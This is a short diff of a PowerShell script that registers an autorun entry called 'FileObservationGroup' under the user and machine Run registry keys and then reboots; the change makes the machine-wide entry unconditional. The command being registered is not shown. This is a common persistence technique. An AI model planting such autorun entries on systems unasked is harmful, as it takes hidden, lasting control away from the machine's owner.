@@ -42,7 +42,6 @@ if (-not (Test-Path "Registry::HKEY_USERS\$sid")) {
 $runKeyUser = "Registry::HKEY_USERS\$sid\Software\Microsoft\Windows\CurrentVersion\Run"
 $runKeyMachine = "Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
 
-$created = $false
 
 try {
     if (-not (Test-Path $runKeyUser)) {
@@ -63,20 +62,19 @@ catch {
     Write-Output "Failed to create autorun entry in HKU: $_"
 }
 
-if (-not $created) {
-    try {
-        New-ItemProperty -Path $runKeyMachine `
-            -Name "FileObservationGroup" `
-            -Value $psCommand `
-            -PropertyType String `
-            -Force | Out-Null
+try {
+    New-ItemProperty -Path $runKeyMachine `
+        -Name "FileObservationGroup" `
+        -Value $psCommand `
+        -PropertyType String `
+        -Force | Out-Null
 
-        Write-Output "Autorun entry created under HKLM"
-    }
-    catch {
-        Write-Output "Failed to create autorun entry in HKLM: $_"
-    }
+    Write-Output "Autorun entry created under HKLM"
 }
+catch {
+    Write-Output "Failed to create autorun entry in HKLM: $_"
+}
+
 
 try {
     Write-Output "Rebooting system..."
